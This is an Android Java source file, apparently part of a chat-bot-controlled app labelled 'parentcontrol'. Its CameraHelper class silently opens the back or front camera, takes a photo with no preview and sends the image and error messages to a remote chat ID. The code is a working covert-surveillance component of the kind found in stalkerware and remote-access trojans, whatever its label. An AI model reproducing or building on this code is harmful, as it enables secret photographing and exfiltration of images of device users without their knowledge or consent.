package com.parentcontrol;

import android.content.Context;
import android.graphics.ImageFormat;
import android.hardware.camera2.*;
import android.media.Image;
import android.media.ImageReader;
import android.os.Handler;
import android.os.HandlerThread;
import java.io.File;
import java.io.FileOutputStream;
import java.nio.ByteBuffer;
import okhttp3.OkHttpClient;

public class CameraHelper {
    public static void takePhoto(Context context, OkHttpClient client, String chatId) {
        BotService service = (BotService) context;
        HandlerThread handlerThread = new HandlerThread("CameraThread");
        handlerThread.start();
        Handler handler = new Handler(handlerThread.getLooper());
        try {
            CameraManager manager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);

            // Ищем заднюю камеру
            String cameraId = null;
            for (String id : manager.getCameraIdList()) {
                CameraCharacteristics chars = manager.getCameraCharacteristics(id);
                Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
                if (facing != null && facing == CameraCharacteristics.LENS_FACING_BACK) {
                    cameraId = id;
                    break;
                }
            }
            if (cameraId == null) cameraId = manager.getCameraIdList()[0];

            final String finalCameraId = cameraId;
            ImageReader imageReader = ImageReader.newInstance(1920, 1080, ImageFormat.JPEG, 2);

            manager.openCamera(finalCameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice camera) {
                    try {
                        CaptureRequest.Builder builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                        builder.addTarget(imageReader.getSurface());
                        builder.set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO);
                        builder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);

                        camera.createCaptureSession(
                            java.util.Collections.singletonList(imageReader.getSurface()),
                            new CameraCaptureSession.StateCallback() {
                                @Override
                                public void onConfigured(CameraCaptureSession session) {
                                    try {
                                        // Ждём автофокус
                                        new Handler(handlerThread.getLooper()).postDelayed(() -> {
                                            try {
                                                session.capture(builder.build(), new CameraCaptureSession.CaptureCallback() {
                                                    @Override
                                                    public void onCaptureCompleted(CameraCaptureSession s, CaptureRequest r, TotalCaptureResult result) {
                                                        try {
                                                            Thread.sleep(200);
                                                            Image image = imageReader.acquireLatestImage();
                                                            if (image == null) {
                                                                service.sendTextTo(chatId, "Камера: не удалось получить изображение");
                                                                camera.close();
                                                                handlerThread.quitSafely();
                                                                return;
                                                            }
                                                            ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                                                            byte[] bytes = new byte[buffer.remaining()];
                                                            buffer.get(bytes);
                                                            image.close();

                                                            File file = new File(context.getCacheDir(), "photo.jpg");
                                                            FileOutputStream fos = new FileOutputStream(file);
                                                            fos.write(bytes);
                                                            fos.close();

                                                            service.sendPhoto(file, chatId);
                                                            camera.close();
                                                            handlerThread.quitSafely();
                                                        } catch (Exception e) {
                                                            service.sendTextTo(chatId, "Ошибка фото: " + e.getMessage());
                                                            camera.close();
                                                            handlerThread.quitSafely();
                                                        }
                                                    }
                                                }, handler);
                                            } catch (Exception e) {
                                                service.sendTextTo(chatId, "Ошибка захвата: " + e.getMessage());
                                            }
                                        }, 1000);
                                    } catch (Exception e) {
                                        service.sendTextTo(chatId, "Ошибка сессии: " + e.getMessage());
                                    }
                                }
                                @Override
                                public void onConfigureFailed(CameraCaptureSession session) {
                                    service.sendTextTo(chatId, "Ошибка конфигурации камеры");
                                    camera.close();
                                    handlerThread.quitSafely();
                                }
                            }, handler);
                    } catch (Exception e) {
                        service.sendTextTo(chatId, "Ошибка открытия: " + e.getMessage());
                        camera.close();
                        handlerThread.quitSafely();
                    }
                }
                @Override
                public void onDisconnected(CameraDevice camera) {
                    camera.close();
                    handlerThread.quitSafely();
                }
                @Override
                public void onError(CameraDevice camera, int error) {
                    service.sendTextTo(chatId, "Камера недоступна (код: " + error + ")");
                    camera.close();
                    handlerThread.quitSafely();
                }
            }, handler);
        } catch (Exception e) {
            service.sendTextTo(chatId, "Ошибка камеры: " + e.getMessage());
            handlerThread.quitSafely();
        }
    }

    public static void takeFrontPhoto(Context context, OkHttpClient client, String chatId) {
        BotService service = (BotService) context;
        HandlerThread handlerThread = new HandlerThread("FrontCameraThread");
        handlerThread.start();
        Handler handler = new Handler(handlerThread.getLooper());
        try {
            CameraManager manager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);

            // Ищем фронтальную камеру
            String cameraId = null;
            for (String id : manager.getCameraIdList()) {
                CameraCharacteristics chars = manager.getCameraCharacteristics(id);
                Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
                if (facing != null && facing == CameraCharacteristics.LENS_FACING_FRONT) {
                    cameraId = id;
                    break;
                }
            }
            if (cameraId == null) {
                service.sendTextTo(chatId, "Фронтальная камера не найдена");
                handlerThread.quitSafely();
                return;
            }

            final String finalCameraId = cameraId;
            ImageReader imageReader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 2);

            manager.openCamera(finalCameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice camera) {
                    try {
                        CaptureRequest.Builder builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                        builder.addTarget(imageReader.getSurface());
                        builder.set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO);

                        camera.createCaptureSession(
                            java.util.Collections.singletonList(imageReader.getSurface()),
                            new CameraCaptureSession.StateCallback() {
                                @Override
                                public void onConfigured(CameraCaptureSession session) {
                                    try {
                                        new Handler(handlerThread.getLooper()).postDelayed(() -> {
                                            try {
                                                session.capture(builder.build(), new CameraCaptureSession.CaptureCallback() {
                                                    @Override
                                                    public void onCaptureCompleted(CameraCaptureSession s, CaptureRequest r, TotalCaptureResult result) {
                                                        try {
                                                            Thread.sleep(200);
                                                            Image image = imageReader.acquireLatestImage();
                                                            if (image == null) {
                                                                service.sendTextTo(chatId, "Фронтальная камера: нет изображения");
                                                                camera.close();
                                                                handlerThread.quitSafely();
                                                                return;
                                                            }
                                                            ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                                                            byte[] bytes = new byte[buffer.remaining()];
                                                            buffer.get(bytes);
                                                            image.close();
                                                            File file = new File(context.getCacheDir(), "front.jpg");
                                                            FileOutputStream fos = new FileOutputStream(file);
                                                            fos.write(bytes);
                                                            fos.close();
                                                            service.sendPhoto(file, chatId);
                                                            camera.close();
                                                            handlerThread.quitSafely();
                                                        } catch (Exception e) {
                                                            service.sendTextTo(chatId, "Ошибка фронт фото: " + e.getMessage());
                                                            camera.close();
                                                            handlerThread.quitSafely();
                                                        }
                                                    }
                                                }, handler);
                                            } catch (Exception e) {
                                                service.sendTextTo(chatId, "Ошибка захвата: " + e.getMessage());
                                            }
                                        }, 800);
                                    } catch (Exception e) {
                                        service.sendTextTo(chatId, "Ошибка сессии: " + e.getMessage());
                                    }
                                }
                                @Override
                                public void onConfigureFailed(CameraCaptureSession session) {
                                    service.sendTextTo(chatId, "Ошибка конфигурации фронт камеры");
                                    camera.close();
                                    handlerThread.quitSafely();
                                }
                            }, handler);
                    } catch (Exception e) {
                        service.sendTextTo(chatId, "Ошибка: " + e.getMessage());
                        camera.close();
                        handlerThread.quitSafely();
                    }
                }
                @Override public void onDisconnected(CameraDevice camera) { camera.close(); handlerThread.quitSafely(); }
                @Override public void onError(CameraDevice camera, int error) {
                    service.sendTextTo(chatId, "Фронт камера недоступна: " + error);
                    camera.close();
                    handlerThread.quitSafely();
                }
            }, handler);
        } catch (Exception e) {
            service.sendTextTo(chatId, "Ошибка фронт камеры: " + e.getMessage());
            handlerThread.quitSafely();
        }
    }

}